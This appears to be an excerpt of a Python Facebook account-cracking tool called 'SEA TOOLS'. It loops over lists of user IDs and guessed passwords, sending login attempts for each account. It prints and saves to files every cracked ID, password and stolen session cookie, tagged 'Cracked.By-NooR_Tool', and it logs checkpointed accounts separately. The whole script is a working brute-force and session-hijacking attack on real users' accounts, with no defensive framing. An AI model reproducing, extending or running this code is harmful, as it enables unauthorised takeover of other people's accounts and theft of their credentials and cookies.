...
#__________/EXIT\__________#
    def __exitX__(self):print(f"{xp} THANK'S FOR USING SEA TOOLS....! ")
...
#__________/FILE\__________#
    def __fileX__(self):
    	self.__clearX__();print(f"{xp} EXAMPLE  {xpxx} /sdcard/SEA.txt {G}/{W} SEA.txt");self.__lineX__();__fileloX__ = input(f"{xpx} INPUT FILE {xpxx} ")
...
#__________/FILE-M1\__________#
    def ___M1___(self,ids,names,passlist):
        try:
            ...
            sys.stdout.write(f'\r{xp}{W}-{W}/{color}SEA-XD{W}/{G}-{W}/{color}{self.loop}{W}/{G}-{W}/{G}{len(self.oks)}{W}/{G}-{W}/{R}{len(self.cps)}{W}/ ');sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                if 'session_key' in po:
                    ...
                    print(f'\r{xp}{G}-{W}/{G}SEA-OK{W}/{G} '+ids+f'{W} / {G}'+pas+'\033[1;97m')
                    print(f'\r{xp}{G}-{W}/{G}COOKIE{W}/{colorX} sb=Cracked.By-NooR_Tool;'+coki);print(f'\r{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    ...
                    print(f'\r{xp}{G}-{W}/{R}SEA-CP{W}/{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
        ...
        try:
            ...
            for pw in passlist:
                ...
                if 'session_key' in po:
                    ...
                    print(f'\r{xp}{G}-{W}/{G}SEA-OK{W}/{G} '+ids+f'{W} / {G}'+pas+'\033[1;97m')
                    print(f'\r{xp}{G}-{W}/{G}COOKIE{W}/{colorX} sb=Cracked.By-NooR_Tool;'+coki);print(f'\r{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    open('/sdcard/SEA-XD/FILE/SEA-M5-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-NooR_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f'\r{xp}{G}-{W}/{R}SEA-CP{W}/{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/SEA-XD/FILE/SEA-M5-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        ...
        try:
            ...
            for pw in passlist:
                ...
                if 'session_key' in po:
                    ...
                    print(f'\r{xp}{G}-{W}/{G}SEA-OK{W}/{G} '+ids+f'{W} / {G}'+pas+'\033[1;97m')
                    print(f'\r{xp}{G}-{W}/{G}COOKIE{W}/{colorX} sb=Cracked.By-NooR_Tool;'+coki);print(f'\r{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    open('/sdcard/SEA-XD/FILE/SEA-M6-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-NooR_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f'\r{xp}{G}-{W}/{R}SEA-CP{W}/{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/SEA-XD/FILE/SEA-M6-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        ...
        try:
            ...
            for pw in passlist:
                ...
                if 'session_key' in po:
                    ...
                    print(f'\r{xp}{G}-{W}/{G}SEA-OK{W}/{G} '+ids+f'{W} / {G}'+pas+'\033[1;97m')
                    print(f'\r{xp}{G}-{W}/{G}COOKIE{W}/{colorX} sb=Cracked.By-NooR_Tool;'+coki);print(f'\r{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    open('/sdcard/SEA-XD/FILE/SEA-M7-OK.txt','a').write(ids+'/'+pas+'/sb=Cracked.By-NooR_Tool;'+coki+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f'\r{xp}{G}-{W}/{R}SEA-CP{W}/{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/SEA-XD/FILE/SEA-M7-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        ...
        try:
            for pas in psd:
                ...
                if 'session_key' in po:
                    uid = po['uid']
                    coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                    print(f'\r{xp}{W}-{R}/{G}SEA-OK{R}/{G} {str(uid)} {R}/{G} {pas} ')
                    print(f'\r{xp}{W}-{R}/{G}💚{R}/{G} '+coki);print(f'\r{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                    open('/sdcard/SEA-XD/RANDOM/SEA-M1-RANDOM-OK.txt','a').write(str(uid)+'/'+pas+'/sb=Cracked.By-NooR_Tool;'+coki+'\n')
                    self.oks.append(str(uid))
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    uid = po['error']['error_data']['uid']
                    print(f'\r\r{xp}{W}-{R}/{Y}SEA-CP{R}/{Y}'+ids+' | '+pas+'\033[1;37m')
                    open('/sdcard/SEA-XD/RANDOM/SEA-M1-RANDOM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
...
#__________/RANDOM-M2\__________#
    def ___M2X___(self,ids,psd,tl):
    	for pas in psd:
    	    print(f"{xp}{G}-{W}/{G}SEA-OK{W}/{G} {ids} {W}/{G} {pas}")
